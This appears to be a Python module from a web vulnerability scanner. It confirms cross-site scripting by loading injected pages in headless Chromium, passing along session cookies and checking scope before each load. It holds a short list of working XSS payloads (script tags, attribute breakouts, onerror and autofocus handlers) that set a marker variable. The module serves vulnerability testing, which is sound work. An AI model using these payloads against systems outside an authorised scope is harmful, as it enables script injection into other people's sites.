"""Stage 2 for cross site scripting. Load the page in a real browser.

Reflection is not execution. A page can hand your input straight back and still
be perfectly safe, because it escaped the angle brackets, or because it set the
content type to text/plain so the browser renders your script as words. Checking
"did my payload come back" cannot tell those apart from a real bug, and that is
where a lot of scanner noise comes from.

So this does not read the response at all. It sends a payload that sets one
variable to a value only this run knows, loads the page in headless chromium,
and asks the browser what that variable holds. If the browser says the value
back, the script ran. Nothing else sets that variable. There is no inference
left to argue with.

The token is fresh for every single attempt, so a page left over from an earlier
check can never answer for a later one.

Two things this has to be careful about:

The browser does not go through HttpClient, which is where the scope check and
the rate limit live. So the scope gets checked here, by hand, before anything is
loaded. Otherwise the one rule the whole project is built on has a hole in it
exactly where the tool drives a real browser.

And the browser starts with no session. On any target with a login that means it
would be sent straight back to the login page and would prove nothing, so the
cookies from the logged in http client get handed over first.
"""
import html
import secrets
from urllib.parse import urlencode, urlparse

from playwright.sync_api import sync_playwright

from ..config import OutOfScopeError
from ..findings import Finding, Verdict

# The variable the payload sets. Long and specific so no real page has one.
PROOF_VAR = "__proofscan_xss"

# One payload per place the input might land. {token} is filled with a fresh
# random value each time, and the browser has to hand that exact value back.
PAYLOADS = [
    # dropped straight into the html
    '<script>window.{var}="{token}"</script>',
    # inside a double quoted attribute, break out of it first
    '"><script>window.{var}="{token}"</script>',
    # inside a single quoted attribute
    '\'><script>window.{var}="{token}"</script>',
    # script tags filtered, but an event handler still runs
    '<img src=x onerror=window.{var}="{token}">',
    # stuck inside an attribute with no way out, so stay there and use a handler
    # that fires on its own without anybody clicking anything
    '" onfocus=window.{var}=\'{token}\' autofocus x="',
]

PAGE_TIMEOUT_MS = 15000


def cookies_from(client, base_url):
    """Take the logged in session out of the http client and give it to chromium.

    Playwright takes either a domain and path, or a url. Using the url avoids a
    trap that cost a scan: a cookie we set ourselves, from --cookie, arrives
    with no domain on it at all, so anything that filters or matches on domain
    drops it without a word. DVWA's security cookie is exactly one of those, and
    losing it meant the browser was quietly looking at the fully patched build
    while the http client was looking at the vulnerable one.

    Names are deduplicated because the jar holds the same session cookie twice,
    once under "127.0.0.1" and once under ".127.0.0.1".
    """
    latest = {}
    for cookie in client._client.cookies.jar:
        latest[cookie.name] = cookie.value
    return [{"name": name, "value": value, "url": base_url}
            for name, value in latest.items()]


class BrowserProver:
    """Holds one chromium instance for the whole scan.

    Starting a browser costs about a second, which is nothing once but a great
    deal once per injection point.
    """

    def __init__(self, scope, cookies=None):
        self.scope = scope
        self.cookies = cookies or []
        self._pw = None
        self._browser = None
        self._context = None
        self.pages_loaded = 0

    def __enter__(self):
        self._pw = sync_playwright().start()
        self._browser = self._pw.chromium.launch(headless=True)
        self._context = self._browser.new_context()
        if self.cookies:
            self._context.add_cookies(self.cookies)
        return self

    def __exit__(self, *exc):
        for closer in (self._context, self._browser):
            try:
                closer.close()
            except Exception:
                pass
        try:
            self._pw.stop()
        except Exception:
            pass

    def _url_for(self, point, payload):
        params = point.base_params()
        params[point.param] = payload
        return f"{point.url}?{urlencode(params)}"

    def ran(self, point, payload, token):
        """Load the payload and ask the browser whether the script ran."""
        page = self._context.new_page()
        # a payload that opens a dialog would otherwise sit there forever
        page.on("dialog", lambda d: d.dismiss())
        try:
            if point.method == "POST":
                self._submit_form(page, point, payload)
            else:
                url = self._url_for(point, payload)
                if not self.scope.allows(url):
                    raise OutOfScopeError(f"out of scope: {url}")
                page.goto(url, timeout=PAGE_TIMEOUT_MS, wait_until="load")

            self.pages_loaded += 1
            return page.evaluate(f"window.{PROOF_VAR} || null") == token
        finally:
            try:
                page.close()
            except Exception:
                pass

    def _submit_form(self, page, point, payload):
        """POST it the way a browser would, by building a form and sending it.

        Fetching a page with a post body is easy, but the response has to be
        rendered and scripted for any of this to mean anything, and that only
        happens if the browser navigates there itself.
        """
        if not self.scope.allows(point.url):
            raise OutOfScopeError(f"out of scope: {point.url}")

        params = point.base_params()
        params[point.param] = payload
        inputs = "".join(
            f'<input name="{html.escape(str(k), quote=True)}" '
            f'value="{html.escape(str(v), quote=True)}">'
            for k, v in params.items()
        )
        page.set_content(
            f'<form id="pf" method="post" action="{html.escape(point.url, quote=True)}">'
            f"{inputs}</form><script>document.getElementById('pf').submit()</script>"
        )
        page.wait_for_load_state("load", timeout=PAGE_TIMEOUT_MS)


def validate(prover, point, reason):
    attempts = []

    for template in PAYLOADS:
        token = "pf" + secrets.token_hex(8)
        payload = template.format(var=PROOF_VAR, token=token)

        try:
            executed = prover.ran(point, payload, token)
        except OutOfScopeError:
            raise
        except Exception as e:
            attempts.append({"payload": payload, "result": f"could not load: {e}"})
            continue

        if executed:
            return Finding(
                "xss", point, Verdict.CONFIRMED,
                "the injected script ran in a real browser",
                {
                    "detector_reason": reason,
                    "technique": "browser",
                    "proof": {
                        "payload": payload,
                        "token": token,
                        "variable": f"window.{PROOF_VAR}",
                        "read_back": token,
                    },
                    "attempts": attempts,
                },
            )

        attempts.append({"payload": payload, "result": "loaded, but nothing ran"})

    return Finding("xss", point, Verdict.REJECTED,
                   f"input comes back, but none of the {len(PAYLOADS)} payloads "
                   f"executed in a browser",
                   {"detector_reason": reason, "technique": "browser",
                    "attempts": attempts})
